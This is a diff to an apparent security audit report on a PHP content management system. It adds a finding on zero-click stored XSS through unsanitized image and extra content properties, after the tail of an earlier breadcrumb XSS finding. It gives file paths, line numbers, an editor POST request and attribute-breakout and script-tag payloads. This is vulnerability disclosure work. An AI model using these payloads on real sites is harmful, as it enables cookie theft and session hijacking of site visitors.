@@ -219,3 +219,17 @@ Frontend module params are prefixed `cntnt01`; admin module params are prefixed 
   ```
 - **Payload:** menu text = `" onmouseover="alert(document.cookie)`
 - **Description:** `strip_tags` removes tags but leaves `"` and event-handler text, so menu text set by any content editor (including a non-owner additional editor) breaks out of the breadcrumb link's `title="..."` attribute, injecting an `onmouseover` handler that executes for any site visitor who hovers the breadcrumb — a stored XSS seeded from the admin side and fired on the public frontend. The output-encoding asymmetry (`{title}` HTML-encodes, `{menu_text}` does not) is the root cause; attribute-context templates make it exploitable despite the input filter.
+
+---
+
+## 18. Stored XSS (zero-click) — unsanitized content properties (image / extra fields)
+- **Name:** Stored Cross-Site Scripting (CWE-79)
+- **File:** no input filter on `image`/`thumbnail`/`extra1`/`extra2`/`extra3` — `lib/classes/class.ContentBase.php` FillParams does `SetPropertyValue($oneparam, $params[$oneparam])` with no `strip_tags`/encoding; raw output in an `<img src>`/`alt` at `lib/plugins/function.page_image.php:52-61`, and raw text via `lib/plugins/function.page_attr.php:89` (`{page_attr key='extra1'}`).
+- **URL:**
+  ```
+  set (content editor): POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY
+                        m1_content_id=<page>&image=x" onerror="alert(document.cookie)&m1_submit=1
+  fire (any visitor):   browse any frontend page whose template uses {page_image tag=1} (or {page_attr key='extra1'})
+  ```
+- **Payload:** image = `x" onerror="alert(document.cookie)` → renders `<img src="x" onerror="alert(document.cookie)"/>`; or extra1 = `<script>alert(document.cookie)</script>`
+- **Description:** Unlike name/menutext/titleattribute (which at least get `strip_tags`), the `image`, `thumbnail`, and `extra1-3` content properties are stored completely raw. `{page_image tag=1}` inlines the `image` value into `src="..."` unescaped → an `onerror` payload gives a **zero-click** stored XSS on the public frontend for every visitor; `{page_attr key='extra1'}` emits `extra*` raw so `<script>` works directly. Settable by any content editor (including a non-owner additional editor) on any page they can edit.
